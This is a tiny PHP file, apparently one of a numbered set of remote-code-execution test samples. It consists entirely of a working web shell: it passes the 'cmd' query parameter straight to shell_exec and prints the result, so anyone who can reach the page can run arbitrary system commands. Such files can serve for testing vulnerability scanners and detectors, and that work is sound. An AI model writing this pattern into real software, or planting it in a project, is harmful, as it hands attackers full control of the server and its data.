<?php
// RCE test variation #1230
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>